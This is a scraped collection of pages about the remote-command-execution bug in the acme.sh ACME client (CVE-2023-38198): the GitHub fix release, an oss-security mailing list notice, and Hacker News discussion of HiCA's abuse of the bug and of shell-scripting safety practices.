[![](https://external-preview.redd.it/runs-arbitrary-commands-from-a-remote-server-v0-op9wApm4UyWJ66PBuqfZV3HhIqBMXTwgKOAuEUKdWWc.jpg?width=640&crop=smart&auto=webp&s=54e6c09c0dda325c93ea4fd15324b5da1f382837) [![r/netsec - acme.sh runs arbitrary commands from a remote server](https://external-preview.redd.it/runs-arbitrary-commands-from-a-remote-server-v0-op9wApm4UyWJ66PBuqfZV3HhIqBMXTwgKOAuEUKdWWc.jpg?width=640&crop=smart&auto=webp&s=54e6c09c0dda325c93ea4fd15324b5da1f382837)](https://github.com/acmesh-official/acme.sh/issues/4659)](https://github.com/acmesh-official/acme.sh/issues/4659)
[github.com

Open](https://github.com/acmesh-official/acme.sh/issues/4659)

**Top 1%**
[Rank by size](https://www.reddit.com/best/communities/6/#t5_1rqwi/)

 Public

Anyone can view, post, and comment to this community

## Top Posts

---

* [Reddit

  reReddit: Top posts of June 9, 2023

  ---](https://www.reddit.com/posts/2023/june-9-1/)
* [Reddit

  reReddit: Top posts of June 2023

  ---](https://www.reddit.com/posts/2023/june/)
* [Reddit

  reReddit: Top posts of 2023

  ---](https://www.reddit.com/posts/2023/)

- &nbsp;

---

- TOPICS

- Internet Culture (Viral)

* [Amazing](https://reddit.com/t/amazing/)

* [Animals & Pets](https://reddit.com/t/animals_and_pets/)

* [Cringe & Facepalm](https://reddit.com/t/cringe_and_facepalm/)

* [Funny](https://reddit.com/t/funny/)

* [Interesting](https://reddit.com/t/interesting/)

* [Memes](https://reddit.com/t/memes/)

* [Oddly Satisfying](https://reddit.com/t/oddly_satisfying/)

* [Reddit Meta](https://reddit.com/t/reddit_meta/)

* [Wholesome & Heartwarming](https://reddit.com/t/wholesome_and_heartwarming/)

- Games

* [Action Games](https://reddit.com/t/action_games/)

* [Adventure Games](https://reddit.com/t/adventure_games/)

* [Esports](https://reddit.com/t/esports/)

* [Gaming Consoles & Gear](https://reddit.com/t/gaming_consoles_and_gear/)

* [Gaming News & Discussion](https://reddit.com/t/gaming_news_and_discussion/)

* [Mobile Games](https://reddit.com/t/mobile_games/)

* [Other Games](https://reddit.com/t/other_games/)

* [Role-Playing Games](https://reddit.com/t/role_playing_games/)

* [Simulation Games](https://reddit.com/t/simulation_games/)

* [Sports & Racing Games](https://reddit.com/t/sports_and_racing_games/)

* [Strategy Games](https://reddit.com/t/strategy_games/)

* [Tabletop Games](https://reddit.com/t/tabletop_games/)

- Q&As

* [Q&As](https://reddit.com/t/q_and_as/)

* [Stories & Confessions](https://reddit.com/t/stories_and_confessions/)

- Technology

* [3D Printing](https://reddit.com/t/3d_printing/)

* [Artificial Intelligence & Machine Learning](https://reddit.com/t/artificial_intelligence_and_machine_learning/)

* [Computers & Hardware](https://reddit.com/t/computers_and_hardware/)

* [Consumer Electronics](https://reddit.com/t/consumer_electronics/)

* [DIY Electronics](https://reddit.com/t/diy_electronics/)

* [Programming](https://reddit.com/t/programming/)

* [Software & Apps](https://reddit.com/t/software_and_apps/)

* [Streaming Services](https://reddit.com/t/streaming_services/)

* [Tech News & Discussion](https://reddit.com/t/tech_news_and_discussion/)

* [Virtual & Augmented Reality](https://reddit.com/t/virtual_and_augmented_reality/)

- Pop Culture

* [Celebrities](https://reddit.com/t/celebrities/)

* [Creators & Influencers](https://reddit.com/t/creators_and_influencers/)

* [Generations & Nostalgia](https://reddit.com/t/generations_and_nostalgia/)

* [Podcasts](https://reddit.com/t/podcasts/)

* [Streamers](https://reddit.com/t/streamers/)

* [Tarot & Astrology](https://reddit.com/t/tarot_and_astrology/)

- Movies & TV

* [Action Movies & Series](https://reddit.com/t/action_movies_and_series/)

* [Animated Movies & Series](https://reddit.com/t/animated_movies_and_series/)

* [Comedy Movies & Series](https://reddit.com/t/comedy_movies_and_series/)

* [Crime, Mystery, & Thriller Movies & Series](https://reddit.com/t/crime_mystery_and_thriller_movies_and_series/)

* [Documentary Movies & Series](https://reddit.com/t/documentary_movies_and_series/)

* [Drama Movies & Series](https://reddit.com/t/drama_movies_and_series/)

* [Fantasy Movies & Series](https://reddit.com/t/fantasy_movies_and_series/)

* [Horror Movies & Series](https://reddit.com/t/horror_movies_and_series/)

* [Movie News & Discussion](https://reddit.com/t/movie_news_and_discussion/)

* [Reality TV](https://reddit.com/t/reality_tv/)

* [Romance Movies & Series](https://reddit.com/t/romance_movies_and_series/)

* [Sci-Fi Movies & Series](https://reddit.com/t/scifi_movies_and_series/)

* [Superhero Movies & Series](https://reddit.com/t/superhero_movies_and_series/)

* [TV News & Discussion](https://reddit.com/t/tv_news_and_discussion/)

---

- RESOURCES

- [About Reddit](https://www.redditinc.com)
 - [Advertise](https://accounts.reddit.com/adsregister?utm_source=web3x_consumer&utm_name=left_nav_cta)
 - [Help](https://support.reddithelp.com/hc?utm_source=reddit&utm_medium=footer&utm_campaign=evergreen)
 - [Blog](https://redditblog.com/)
 - [Careers](https://www.redditinc.com/careers)
 - [Press](https://www.redditinc.com/press)

---

 - [Communities](https://www.reddit.com/best/communities/1/)
 - [Best of Reddit](https://www.reddit.com/posts/2025/global/)
 - [Topics](https://www.reddit.com/topics/a-1/)

---

 - [Content Policy](https://www.redditinc.com/policies/content-policy)
 - [Privacy Policy](https://www.reddit.com/policies/privacy-policy)
 - [User Agreement](https://www.redditinc.com/policies/user-agreement)

[Reddit, Inc. © 2025. All rights reserved.](https://redditinc.com)

close

# Don’t miss a thing from Reddit!

I agree to get emails about cool stuff on Reddit

Continue

close

# Log In

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

Continue with phone number

---

OR

---

Email or username

Password

Forgot password?

New to Reddit?
Sign Up

Log In

back

# Enter the 6-digit code from your authenticator app

You’ve set up two-factor authentication for this account.

Verification code

Lost access to your authenticator?
Use a backup code

Check code

back

# Enter a 6-digit backup code

You’ve set up two-factor authentication for this account.

Backup code

Don’t have access to your backup code?
Use a code from an authenticator app

Check code

close

# Sign Up

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

I agree to get emails about cool stuff on Reddit

Email

Already a redditor?
Log In

Continue

back

Skip

# Verify your email

Enter the 6-digit code we sent to

Verification code

Didn't get an email?
Resend

Continue

back

# Create your username and password

Reddit is anonymous, so your username is what you’ll go by here. Choose wisely—because once you get a name, you can’t change it.

Username

Password

Continue

close

# Sign Up

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

I agree to get emails about cool stuff on Reddit

Continue with phone number

---

OR

---

Email

Already a redditor?
Log In

Continue

back

Skip

# Verify your email

Enter the 6-digit code we sent to

Verification code

Didn't get an email?
Resend

Continue

back

# Create your username and password

Reddit is anonymous, so your username is what you’ll go by here. Choose wisely—because once you get a name, you can’t change it.

Username

Password

Continue

close

back

# Reset your password

Enter your email address or username and we’ll send you a link to reset your password

Email or username

[Need help?](https://reddithelp.com/hc/sections/360008917491-Account-Security)

Reset password

close

back

# Check your inbox

An email with a link to reset your password was sent to the email address associated with your account

Didn't get an email?

Resend

close

# Choose a Reddit account to continue

back

close

# Reset your password

New password

Confirm new password

Resetting your password will log you out on all devices.

Continue



=== Content from github.com_c165d78e_20250110_141533.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Freleases%2Ftag%2F3.0.6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Freleases%2Ftag%2F3.0.6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=acmesh-official%2Facme.sh)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[acmesh-official](/acmesh-official)
/
**[acme.sh](/acmesh-official/acme.sh)**
Public

* [Notifications](/login?return_to=%2Facmesh-official%2Facme.sh) You must be signed in to change notification settings
* [Fork
  5.1k](/login?return_to=%2Facmesh-official%2Facme.sh)
* [Star
   40.6k](/login?return_to=%2Facmesh-official%2Facme.sh)

* [Code](/acmesh-official/acme.sh/tree/3.0.6)
* [Issues
  1k](/acmesh-official/acme.sh/issues)
* [Pull requests
  216](/acmesh-official/acme.sh/pulls)
* [Discussions](/acmesh-official/acme.sh/discussions)
* [Actions](/acmesh-official/acme.sh/actions)
* [Wiki](/acmesh-official/acme.sh/wiki)
* [Security](/acmesh-official/acme.sh/security)
* [Insights](/acmesh-official/acme.sh/pulse)

Additional navigation options

* [Code](/acmesh-official/acme.sh/tree/3.0.6)
* [Issues](/acmesh-official/acme.sh/issues)
* [Pull requests](/acmesh-official/acme.sh/pulls)
* [Discussions](/acmesh-official/acme.sh/discussions)
* [Actions](/acmesh-official/acme.sh/actions)
* [Wiki](/acmesh-official/acme.sh/wiki)
* [Security](/acmesh-official/acme.sh/security)
* [Insights](/acmesh-official/acme.sh/pulse)

1. [Releases](/acmesh-official/acme.sh/releases)
2. [3.0.6](/acmesh-official/acme.sh/releases/tag/3.0.6)

# Fix important remote exec bug

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/acmesh-official/acme.sh/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...3.0.6)

 Loading

[View all tags](/acmesh-official/acme.sh/tags)

![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=40&v=4)
[Neilpang](/Neilpang)
released this
09 Jun 13:12

·
[581 commits](/acmesh-official/acme.sh/compare/3.0.6...master)
to master
since this release

[3.0.6](/acmesh-official/acme.sh/tree/3.0.6)

[`b7caf7a`](/acmesh-official/acme.sh/commit/b7caf7a0165d80dd1556b16057a06bb32025066d)

This commit was created on GitHub.com and signed with GitHub’s **verified signature**.
The key has expired.

GPG key ID: 4AEE18F83AFDEB23
Expired

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

Please all upgrade.

[#4659](https://github.com/acmesh-official/acme.sh/issues/4659)

 Assets
2

 Loading

 👍
46
 JonnyTech, LeviMarvin, andrewnicolalde, codl, darthsteven, war59312, williamdes, turtleqiu, omnivagant, Konano, and 36 more reacted with thumbs up emoji
 🎉
2
 ctomkow and nAnderYang reacted with hooray emoji
 🚀
18
 aswifi, LeviMarvin, andrewnicolalde, bobby285271, war59312, justin, onkoe, houseme, zachkont, eduardo010174, and 8 more reacted with rocket emoji

All reactions

* 👍
  46 reactions
* 🎉
  2 reactions
* 🚀
  18 reactions

 54 people reacted

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from news.ycombinator.com_9b59cbdd_20250110_141536.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D36254093) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [regecks](user?id=regecks) [on June 9, 2023](item?id=36254093)   | [parent](item?id=36252310) | [context](context?id=36254093) | [favorite](fave?id=36254093&auth=70c7d3202d79ad39d5d048f8f014b1d5907a9a14) | on: [Acme.sh runs arbitrary commands from a remote serv...](item?id=36252310)  I think the title buries the most horrifying part of this. The HiCA certificate authority is relying on an RCE to do an end-run around the semantics of the ACME HTTP-01 validation method. Fucked up and they should be booted from every root program for this. | | --- | --- | --- |  | |  |  | [agwa](user?id=agwa) [on June 9, 2023](item?id=36255744)   | [next](#36262430) [–]  They aren't in any root programs. They're just taking certificate requests and relaying them to real CAs, which is why they need to exploit an RCE in the ACME client, since the ACME client wouldn't otherwise be able to complete the validations required by the actual CA. | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [chunk\_waffle](user?id=chunk_waffle) [on June 9, 2023](item?id=36262430)   | [prev](#36255744) | [next](#36254281) [–]  When confronted they just flat out shut down the service. They also donated $1000 to the project, and they've redirected requests to their payment site to the US White House's website, and they're from China. They were also suggesting that user's ran the utility as root... All really shady... | | --- | --- | --- | | | |  |  | [stavros](user?id=stavros) [on June 9, 2023](item?id=36254281)   | [prev](#36262430) [–]  Wow, that's... bold. | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |



=== Content from www.openwall.com_d5366624_20250110_141530.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2023/07/12/3) [[next>]](../../../2023/07/14/1) [[<thread-prev]](../../../2023/06/14/8) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ZLAlvlNOdMKixhiG@netmeister.org>
Date: Thu, 13 Jul 2023 12:26:38 -0400
From: Jan Schaumann <jschauma@...meister.org>
To: oss-security@...ts.openwall.com
Subject: Re: RCE in acme.sh < 3.0.6

Just closing the loop here: this has now been assigned
CVE-2023-38198:

<https://www.cve.org/CVERecord?id=CVE-2023-38198>

Jan Schaumann <jschauma@...meister.org> wrote:
> Hi,
>
> I don't think this has been raised here:
>
> The acme.sh ACME client[1] prior to version 3.0.6[2] has
> an RCE vulnerability allowing a hostile server to
> execute arbitrary commands on the client[3].
>
> I was unable to determine whether a CVE has been
> requested for this issue; both the original discussion
> and a second GitHub issue[4] have been inconclusively
> closed for comments (I've reached out to the author).
>
> The issue is also being discussed on Mozilla's
> dev-security-policy[5].
>
> -Jan
>
> [1] <https://github.com/acmesh-official/acme.sh>
> [2] <https://github.com/acmesh-official/acme.sh/releases>
> [3] <https://github.com/acmesh-official/acme.sh/issues/4659>
> [4] <https://github.com/acmesh-official/acme.sh/issues/4665>
> [5] <https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/heXVr8o83Ys>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from news.ycombinator.com_09d98889_20250110_141536.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D36252310) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [Acme.sh runs arbitrary commands from a remote server](https://github.com/acmesh-official/acme.sh/issues/4659) ([github.com/acmesh-official](from?site=github.com/acmesh-official)) | | --- | --- | --- | |  | | 291 points by [Kesseki](user?id=Kesseki) [on June 9, 2023](item?id=36252310)  | [hide](hide?id=36252310&goto=item%3Fid%3D36252310) | [past](https://hn.algolia.com/?query=Acme.sh%20runs%20arbitrary%20commands%20from%20a%20remote%20server&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=36252310&auth=7cc26b65e7a3c137b957db474dbfd808278d7bb2) | [67 comments](item?id=36252310) |  | |  |  | [predictabl3](user?id=predictabl3) [on June 9, 2023](item?id=36262701)   | [next](#36254093) [–]  Sounds about par for the course for folks that think shell is a productively sustainable way of writing secure or reliable software. Not even remotely sorry about that opinion. The gall to claim ACME compat, then force require a single client, all so you can remote execute arbitrary commands. Should be enough to ruin the CA, but we know how people handle things like this "oh, won't affect *me*" (until it does). Seemingly just so they can avoid some reverse proxy rules to host the challenge endpoints at the right place? Holy *wow*. Oh there we go baby, eval'ing with arbitrary input in the shell script, complete with lazy inproper string quoting. I should probably just stop before I say more unkind things. Was it even run through shellcheck?! Stop writing this stuff in shell people. 95% of the time I review *any* (posix, nushell lacks most of these issues) shell scripts, it's obvious they would fall apart the second any string unexpectedly had a space in it. Even scripts written by darling companies of HN. | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [l0b0](user?id=l0b0) [on June 9, 2023](item?id=36264581)   | [parent](#36262701) | [next](#36264423) [–]  How did we get here? - The barrier to entry for shell scripting is tiny. You basically start with `ls` in an interactive shell and end up writing a frickin' 500-line monstrosity within a month. - POSIX has fossilised scripting languages. I hoped we'd have something like PowerShell by now, but although we have some fine alternatives, none of them seem to be good enough to actually overcome the inertia of POSIX. - Doing something that looks correct is easy, but doing the *right* thing is super effing hard. See looping through complex sets of files. - People use statements like "It's just a script", as if scripts are somehow easy to write. Bullshit. | | --- | --- | --- | | | |  |  | [SergeAx](user?id=SergeAx) [on June 10, 2023](item?id=36266785)   | [root](#36262701) | [parent](#36264581) | [next](#36264423) [–]  Script may be not easy to write, but it's universally easy to deploy. Single almost cross-platform file, no dependencies. Publish the text on a webpage or in an email newsletter so everyone can copy-paste it to their system. Brilliant. | | --- | --- | --- | | | |  |  | [dundarious](user?id=dundarious) [on June 9, 2023](item?id=36264423)   | [parent](#36262701) | [prev](#36264581) | [next](#36263636) [–]  There is almost never a good reason to use constructs like eval in any language (and it exists in many languages), just like there are barely any good reasons to use constructs like system() in C. It appears acme.sh was running eval. I haven't looked into it, but the most common reason I see eval in use is because people don't know that you do it much simpler/more directly by just geting the shell to run commands that are variables with no issue, e.g., `doit() { printf "running: %s\\n" "$\*" ; "$@" ; } ; doit ls /` which works in POSIX sh, no bashisms. (Obviously you should only call it with at least the first argument being trusted) But shell is really not hard if people stick to a few easy guidelines: - quote all var expansion, e.g., "$var" not $var or ${var} (very rare to need otherwise, and never for untrusted data) - use "$@" to perfectly forward arguments (not $@, not $\*, not "$\*" except when you want to turn many arguments into one) - don't use eval - use `set -eu` and explicitly handle functions/commands that may benignly return/exit non-zero, e.g., `diff -U10 ./a ./b || true` - use printf on untrusted strings instead of echo (just use it generally, I say), e.g., printf %s\\n "$var" instead of echo "$var". One of the few times you want to use "$\*" is with printf though, e.g., printf %s\\n "$\*" instead of echo "$@". Try them out, easy to see why, as with one thing to format and multiple arguments, `printf %s\\n "$@"` is equivalent to `for i in "$@" ; do printf %s\\n "$i" ; done` - when using xargs, use -0 if available, or at least -d\\n if available (busybox doesn't have it for example). also usually want to use -r | | --- | --- | --- | | | |  |  | [predictabl3](user?id=predictabl3) [on June 9, 2023](item?id=36265274)   | [root](#36262701) | [parent](#36264423) | [next](#36263636) [–]  And then run shellcheck because even those of us that painful have this seared into our brains make mistakes. Or just use a scripting language that eliminates many of these headaches (nushell) or a real programming language. I get it, I really do. At least now I have nushell for some sanity, but I still find myself constantly writing a shell script and then realizing after a few iterations that *I should've just written in nushell/Rust*. As a thought experiment, how many places rolled out acme.sh to prod and didn't bother code reviewing it or running it through shellcheck? | | --- | --- | --- | | | |  |  | [dundarious](user?id=dundarious) [on June 9, 2023](item?id=36265387)   | [root](#36262701) | [parent](#36265274) | [next](#36263636) [–]  Every language exists on this spectrum, and pretty much every language is clustered near shell. All languages require you to be "principled" in a few key areas, and many projects (open source *and* closed source) don't do a great job at that. At least shell is good at a specific and very useful thing (sequences and pipelines of other commands), and is already installed on most machines -- even windows nowadays since almost everyone has git installed. My "build system" for C projects is just doing the following from pwsh: `& "$env:GIT\_INSTALL\_ROOT\bin\bash.exe" .\build.sh` Most software is not great. That is the issue. | | --- | --- | --- | | | |  |  | [predictabl3](user?id=predictabl3) [on June 10, 2023](item?id=36266979)   | [root](#36262701) | [parent](#36265387) | [next](#36263636) [–]  I'm happy (and spoiled) that I live in a world where I get to use reliable software and not worry about it being inaccessible. With a single nix command, I'm dropped in an environment with secrets mounted by a single age key, with all programs and configuration exactly as I want. It's trivial for me to "just switch" to nushell/rust and not worry about such things. And nushell and rust are *not* clustered near shell for the aspects I'm talking about in this discussion. "bash is everywhere" is just more lipstick on the pig, in my strong opinion. | | --- | --- | --- | | | |  |  | [superkuh](user?id=superkuh) [on June 9, 2023](item?id=36263636)   | [parent](#36262701) | [prev](#36264423) | [next](#36263249) [–]  People write in bash because you can expect bash to be forward compatible with how people write bash. A bash script written by the average person today will run on a bash interpreter from 2006 (or 2023). Very few languages have the developer culture to achieve this in practice even if it might be possible in theory. And it's not like Bash doesn't get new features. It does constantly. But unlike, say, Rust or JS, the developers don't instantly start using forwards incompatible features. It's a different mindset. If you're writing in shell you're writing for longevity and compatibility. Unfortunately requiring approval and authentication from a random incorporated entity running a CA every 90 days is inherently complex. And all the ACME protocol implementations do is hide that inherent complexity by adding even more. CA TLS HTTP is very fragile but it could be made less so if corporate browsers didn't demand short lifetime certs-- a demand reasonable for businesses but not for human people or things expected to last longer than a few years without being touched. | | --- | --- | --- | | | |  |  | [predictabl3](user?id=predictabl3) [on June 9, 2023](item?id=36265248)   | [root](#36262701) | [parent](#36263636) | [next](#36263249) [–]  This doesn't make any sense to me. Stable Rust is forward compatible just as much as shell scripts are. Bash, for example, *does* introduce things in newer versions and they're near universally ignored. All of this also excludes that the fact that your shell script will be just as janky in 10 years as it is now. Again, I regularly, regularly see shell scripts from companies that HN *fawns* over that don't pass shellcheck and have inherent issues that don't occur in better scripting languages, or full programming languages. "Forward-compat" is not unique, and not a value proposition to me if it inherently means less reliable function. | | --- | --- | --- | | | |  |  | [superkuh](user?id=superkuh) [on June 9, 2023](item?id=36265390)   | [root](#36262701) | [parent](#36265248) | [next](#36263249) [–]  Here's an anecdote to provide sense. I recall when I was using a 3 month old (1.48.0 2020-11-19) rustc on Debian 11 (right before it was officially released) and I kept running into rust software I couldn't compile because rust devs used bleeding edge 1.50 (2021-02-11) features. This wasn't a debian is old thing. The rustc was literally 3 months old at this point. At least one of the devs was a person I knew on IRC. He was kind enough to re-write it ("plotsweep" a rust software defined radio program) using only 1.48 and older features. But that's the exception. Most rust devs assume your toolchain is from 3rd party out-of-repository and latest and think forwards compatibility is useless like you do. Shell scripts can be and often are jank. But at least it's stable jank. Shell devs tend to write portable, stable code because that's the entire point of dealing with the shell jank. | | --- | --- | --- | | | |  |  | [predictabl3](user?id=predictabl3) [on June 9, 2023](item?id=36265461)   | [root](#36262701) | [parent](#36265390) | [next](#36263249) [–]  Yeah, I think we're not going to agree on this. I very much like living in a world where I get to use stable, released software, provided by my distro, to build reliable software that is forward compatible. > This wasn't a debian is old thing. From my reading and understanding, yeah, it was. | | --- | --- | --- | | | |  |  | [bheadmaster](user?id=bheadmaster) [on June 10, 2023](item?id=36268307)   | [root](#36262701) | [parent](#36265461) | [next](#36263249) [–]  Three months old software is new enough to be in Arch repository, so in this case it's not about Debian being old, it's about rust devs using bleeding edge features. If you're contradicting a person's argument ("yeah, it was") at least provide some more explanation, otherwise your comment is rarely more than a "is too!". | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [on June 9, 2023](item?id=36263249)   | [parent](#36262701) | [prev](#36263636) | [next](#36265271) [–]  Shell is a bad fit for many uses (an ACME client *is* more ambitious than I would build in shell, personally), but the things it's good at, it's *really* good at. I have yet to find anything else that's even close to as good for glue code when I have a handful of tools and/or a bunch of files that I need to string together. Unless you're writing in Ada, I promise whatever language you think is better has its own sharp edges (if we're allowing eval, then not many languages are going to be safe, really). | | --- | --- | --- | | | |  |  | [Bystroushaak](user?id=Bystroushaak) [on June 9, 2023](item?id=36263748)   | [root](#36262701) | [parent](#36263249) | [next](#36270494) [–]  I usually replace shell scripts with python (using sh module: <https://amoffat.github.io/sh/> for calling other scripts/programs). | | --- | --- | --- | | | |  |  | [pdimitar](user?id=pdimitar) [on June 9, 2023](item?id=36264201)   | [root](#36262701) | [parent](#36263748) | [next](#36264109) [–]  Golang is better suited for this, for my needs at least. | | --- | --- | --- | | | |  |  | [ianlevesque](user?id=ianlevesque) [on June 9, 2023](item?id=36264405)   | [root](#36262701) | [parent](#36264201) | [next](#36264109) [–]  Yeah, lego-acme is a solid alternative. <https://github.com/go-acme/lego> | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [on June 9, 2023](item?id=36264465)   | [root](#36262701) | [parent](#36264405) | [next](#36264109) [–]  Er, are we comparing ACME clients or shell alternatives? | | --- | --- | --- | | | |  |  | [cozzyd](user?id=cozzyd) [on June 9, 2023](item?id=36264109)   | [root](#36262701) | [parent](#36263748) | [prev](#36264201) | [next](#36277083) [–]  yeah until your scripts stop running someday because python... | | --- | --- | --- | | | |  |  | [Bystroushaak](user?id=Bystroushaak) [on June 9, 2023](item?id=36264479)   | [root](#36262701) | [parent](#36264109) | [next](#36277083) [–]  Can you elaborate? | | --- | --- | --- | | | |  |  | [cozzyd](user?id=cozzyd) [on June 9, 2023](item?id=36264573)   | [root](#36262701) | [parent](#36264479) | [next](#36277083) [–]  Python scripts will often break with system upgrades, most acutely when Python2 went away, but under many other circumstances as well. | | --- | --- | --- | | | |  |  | 